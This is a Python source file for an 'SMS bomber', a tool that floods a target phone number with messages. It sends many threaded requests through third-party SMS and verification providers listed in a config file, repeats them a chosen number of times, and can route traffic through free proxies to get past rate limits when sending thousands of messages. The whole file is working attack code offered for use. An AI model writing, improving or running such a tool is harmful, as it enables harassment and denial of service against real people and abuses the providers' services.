import argparse
from concurrent.futures import ThreadPoolExecutor
import json
import time
from Service import Service

from fp.fp import FreeProxy
from colorama import Fore


# args
parser = argparse.ArgumentParser()
parser.add_argument(
    'target',
    metavar='TARGET',
    type=lambda value: (_ for _ in ()).throw(
        argparse.ArgumentTypeError(f'{value} is an invalid mobile number'))
    if 13 <= len(value) <= 4 else value,
    help='Target mobile number without country code')
parser.add_argument('--repetitions',
                    '-r',
                    type=int,
                    help='Number of repetitions (default: 30)',
                    default=30)
parser.add_argument('--country',
                    '-c',
                    type=int,
                    help='Country code without (+) sign',)
parser.add_argument(
    '--proxy',
    '-p',
    action='store_true',
    help=
    'Use proxy for bombing (It is advisable to use this option if you are bombing more than 5000 sms)'
)

args = parser.parse_args()

# config loading
target = str(args.target)
num_of_repetitions = args.repetitions
failed, success = 0, 0

print(Fore.RED + """
..######..##.....##..######.....########....#####...##.....##.########...#######..########.
.##....##.###...###.##....##....##.....##..##...##..###...###.##.....##.##.....##.##.....##
.##.......####.####.##..........##.....##.##.....##.####.####.##.....##........##.##.....##
..######..##.###.##..######.....########..##.....##.##.###.##.########...#######..########.
.......##.##.....##.......##....##.....##.##.....##.##.....##.##.....##........##.##...##..
.##....##.##.....##.##....##....##.....##..##...##..##.....##.##.....##.##.....##.##....##.
..######..##.....##..######.....########....#####...##.....##.########...#######..##.....##                                                                                                                     
""" + Fore.RESET)


print(f'Target: +{args.country}{target}  | Number of repetition: {num_of_repetitions}')


# proxy setup
def get_proxy():
    curl = FreeProxy(country_id=['US', 'RU'], timeout=1).get()
    return {"http": curl, "https": curl}


# bomber function
def bomber(p):
    global failed, success, num_of_repetitions
    if p is None or success > num_of_repetitions:
        return
    elif not p.done:
        try:
            p.start()
            if p.status():
                success += 1
            else:
                failed += 1
        except:
            failed += 1
            print('{:12}: error'.format(p.config['name']))
        pall = [p for x in services.values() for p in x]
        print(f'Bombing : {success+failed}/{len(pall) * num_of_repetitions} | Success: {success} | Failed: {failed}',
              end='\r')


start = time.time()
proxies = get_proxy() if args.proxy else None
services = json.load(open('config.json', 'r'))['providers']
pall = [p for x in services.values() for p in x]
print(f'Processing {len(pall)} providers, please wait!\n')
# threads
with ThreadPoolExecutor(max_workers=len(pall * num_of_repetitions)) as executor:
    for i in range(num_of_repetitions):
        for config in pall:
            executor.submit(
                bomber,
                Service(target,
                         proxy=proxies,
                         verbose=True,
                         cc=str(args.country),
                         config=config))

end = time.time()

# finalize
print(f'\nSuccess: {success} | Failed: {failed}')
print(f'Took {end-start:.2f}s to complete')
